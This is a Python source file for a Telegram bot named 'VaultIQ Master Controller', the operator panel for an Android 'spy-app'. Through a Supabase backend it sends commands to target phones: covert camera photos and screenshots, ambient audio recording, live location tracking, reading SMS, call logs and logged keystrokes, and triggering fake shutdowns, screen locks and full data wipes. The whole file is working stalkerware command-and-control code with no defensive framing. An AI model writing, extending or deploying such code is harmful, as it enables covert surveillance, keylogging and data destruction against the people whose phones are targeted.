import os
import asyncio
import logging
from datetime import datetime, timezone
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from supabase import create_client, Client

# --- Configuration ---
SUPABASE_URL = "https://orrdsscvzaginlvmbyow.supabase.co"
SUPABASE_KEY = "YOUR_SUPABASE_SERVICE_ROLE_KEY" # Full access needed for bot
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

# Initialize Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Menus ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_html(
        rf"🛡️ <b>VaultIQ Master Controller</b> Active."
        f"\n\nWelcome {user.mention_html()}! You can manage all your monitored units directly from this interface."
        "\n\nUse /devices to open the control center."
    )

async def list_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        response = supabase.table("devices").select("*").order("last_seen", desc=True).execute()
        devices = response.data

        if not devices:
            text = "❌ <b>No devices found.</b>\nPlease ensure the spy-app is installed and registered."
            if update.callback_query:
                await update.callback_query.edit_message_text(text, parse_mode='HTML')
            else:
                await update.message.reply_text(text, parse_mode='HTML')
            return

        keyboard = []
        for dev in devices:
            last_seen = datetime.fromisoformat(dev['last_seen'].replace('Z', '+00:00'))
            is_online = (datetime.now(timezone.utc) - last_seen).total_seconds() < 300
            status_icon = "🟢" if is_online else "🔴"
            btn_text = f"{status_icon} {dev['device_name']} [{dev['battery_level']}%]"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"menu_{dev['id']}")])

        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = "📱 <b>VaultIQ Control Center</b>\nSelect a target device to manage:"

        if update.callback_query:
            await update.callback_query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Error: {e}")
        await (update.callback_query.edit_message_text if update.callback_query else update.message.reply_text)("❌ Database Connection Error.")

async def show_main_menu(query, device_id):
    # Fetch latest status
    dev = supabase.table("devices").select("*").eq("id", device_id).single().execute().data

    last_seen = datetime.fromisoformat(dev['last_seen'].replace('Z', '+00:00')).strftime("%H:%M:%S")
    status = "ONLINE 🟢" if (datetime.now(timezone.utc) - datetime.fromisoformat(dev['last_seen'].replace('Z', '+00:00'))).total_seconds() < 300 else "OFFLINE 🔴"

    text = (
        f"⚙️ <b>Control Panel:</b> <code>{dev['device_name']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔋 <b>Battery:</b> {dev['battery_level']}% ({'Charging' if dev['is_charging'] else 'Discharging'})\n"
        f"🛰️ <b>Status:</b> {status}\n"
        f"🕒 <b>Last Seen:</b> {last_seen}\n"
        f"📱 <b>Model:</b> {dev['device_model']} (Android {dev['os_version']})\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Choose an action category below:"
    )

    keyboard = [
        [
            InlineKeyboardButton("📸 Media", callback_data=f"cat_media_{device_id}"),
            InlineKeyboardButton("📍 Tracking", callback_data=f"cat_track_{device_id}")
        ],
        [
            InlineKeyboardButton("📋 View Logs", callback_data=f"cat_logs_{device_id}"),
            InlineKeyboardButton("🔐 Security", callback_data=f"cat_sec_{device_id}")
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data=f"cat_set_{device_id}"),
            InlineKeyboardButton("🔄 Full Sync", callback_data=f"cmd_sync_data_{device_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Device List", callback_data="back_to_devices")]
    ]

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# --- Category Handlers ---

async def handle_categories(query, category, device_id):
    keyboard = []
    text = ""

    if category == "media":
        text = "🖼️ <b>Media Controls</b>\nCapture live visuals from the device."
        keyboard = [
            [InlineKeyboardButton("📷 Take Photo (Front)", callback_data=f"cmd_take_photo_front_{device_id}")],
            [InlineKeyboardButton("📸 Take Photo (Back)", callback_data=f"cmd_take_photo_back_{device_id}")],
            [InlineKeyboardButton("🖼️ Capture Screenshot", callback_data=f"cmd_take_screenshot_{device_id}")],
            [InlineKeyboardButton("🎙️ Record Ambient (30s)", callback_data=f"cmd_record_ambient_{device_id}")]
        ]
    elif category == "track":
        text = "📍 <b>Tracking Controls</b>\nGet real-time location and movement."
        keyboard = [
            [InlineKeyboardButton("🗺️ Fetch Current Location", callback_data=f"cmd_fetch_location_{device_id}")],
            [InlineKeyboardButton("📡 Start Live Track", callback_data=f"cmd_start_tracking_{device_id}")],
            [InlineKeyboardButton("🚫 Stop Live Track", callback_data=f"cmd_stop_tracking_{device_id}")]
        ]
    elif category == "logs":
        text = "📋 <b>Data Logs</b>\nView the most recent data captured."
        keyboard = [
            [InlineKeyboardButton("💬 Last 5 SMS", callback_data=f"view_sms_{device_id}")],
            [InlineKeyboardButton("📞 Last 5 Calls", callback_data=f"view_calls_{device_id}")],
            [InlineKeyboardButton("⌨️ Last Keystrokes", callback_data=f"view_keys_{device_id}")],
            [InlineKeyboardButton("🏢 Installed Apps", callback_data=f"view_apps_{device_id}")]
        ]
    elif category == "sec":
        text = "🔐 <b>Security & Defense</b>\nRemote lockdown and data wipe."
        keyboard = [
            [InlineKeyboardButton("🔒 Lock Device Screen", callback_data=f"cmd_lock_device_{device_id}")],
            [InlineKeyboardButton("🔄 Fake Reboot", callback_data=f"cmd_fake_reboot_{device_id}")],
            [InlineKeyboardButton("🔌 Fake Shutdown", callback_data=f"cmd_fake_shutdown_{device_id}")],
            [InlineKeyboardButton("⚠️ WIPE ALL DATA", callback_data=f"cmd_wipe_data_{device_id}")]
        ]
    elif category == "set":
        text = "⚙️ <b>Feature Settings</b>\nToggle automated monitoring features."
        keyboard = [
            [InlineKeyboardButton("🔔 Toggle Notifications", callback_data=f"cmd_toggle_notif_{device_id}")],
            [InlineKeyboardButton("🎥 Auto Call Record", callback_data=f"cmd_toggle_callrec_{device_id}")],
            [InlineKeyboardButton("🎭 App Morphing", callback_data=f"cat_morph_{device_id}")]
        ]

    keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data=f"menu_{device_id}")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# --- Data Viewers ---

async def view_logs(query, log_type, device_id):
    try:
        table_map = {"sms": "sms", "calls": "call_logs", "keys": "keystrokes", "apps": "installed_apps"}
        table = table_map.get(log_type)

        response = supabase.table(table).select("*").eq("device_id", device_id).order("recorded_at", desc=True).limit(5).execute()
        data = response.data

        if not data:
            msg = f"ℹ️ No {log_type} logs found."
        else:
            msg = f"📋 <b>Latest {log_type.upper()} Logs:</b>\n\n"
            for item in data:
                if log_type == "sms":
                    msg += f"👤 {item['contact_name'] or item['phone_number']}\n💬 {item['content'][:100]}\n🕒 {item['sms_timestamp']}\n\n"
                elif log_type == "calls":
                    msg += f"📞 {item['phone_number']} ({item['call_type']})\n⏳ {item['duration_seconds']}s\n🕒 {item['call_timestamp']}\n\n"
                elif log_type == "keys":
                    msg += f"⌨️ {item['app_name']}: <i>{item['text_content']}</i>\n\n"

        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data=f"cat_logs_{device_id}")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except Exception as e:
        await query.answer(f"Error fetching logs: {str(e)}", show_alert=True)

# --- Callbacks ---

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back_to_devices":
        await list_devices(update, context)

    elif data.startswith("menu_"):
        await show_main_menu(query, data.split("_")[1])

    elif data.startswith("cat_"):
        parts = data.split("_")
        await handle_categories(query, parts[1], parts[2])

    elif data.startswith("view_"):
        parts = data.split("_")
        await view_logs(query, parts[1], parts[2])

    elif data.startswith("cmd_"):
        parts = data.split("_")
        cmd = "_".join(parts[1:-1])
        dev_id = parts[-1]

        try:
            supabase.table("commands").insert({
                "device_id": dev_id,
                "command": cmd,
                "status": "pending"
            }).execute()
            await query.answer(f"✅ Command '{cmd}' sent!", show_alert=False)
        except Exception as e:
            await query.answer(f"❌ Error: {str(e)}", show_alert=True)

if __name__ == '__main__':
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("Set your token first!")
        exit(1)

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("devices", list_devices))
    app.add_handler(CallbackQueryHandler(handle_callback))

    print("🚀 VaultIQ Master Bot is running...")
    app.run_polling()
